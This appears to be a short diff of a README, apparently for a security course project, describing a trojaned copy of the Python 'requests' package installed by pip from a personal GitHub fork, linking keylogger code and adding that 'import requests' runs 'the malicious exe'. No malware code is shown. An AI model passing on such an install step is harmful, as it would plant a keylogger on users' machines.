@@ -10,3 +10,9 @@ python -m pip install https://github.com/doge-12369/requests/archive/refs/heads/
 Code for the keylogger is here
 
 https://github.com/doge-12369/6841keylogger
+
+To run the malicious exe, simply 
+
+```bash
+import requests
+```
